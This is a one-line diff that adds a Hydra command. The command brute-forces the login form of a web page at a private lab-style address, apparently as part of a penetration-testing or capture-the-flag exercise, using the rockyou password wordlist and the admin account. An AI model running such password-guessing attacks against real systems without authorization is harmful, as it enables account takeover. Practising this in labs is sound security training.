@@ -1,0 +1,1 @@
+hydra -l admin@isints -P /usr/share/wordlists/rockyou.txt 10.10.10.100 http-post-form "/login.php:email=^USER^&pass=^PASS^&submit=Login&submitted=TRUE:our browser must allow cookies in order to log in." -o hydra.log
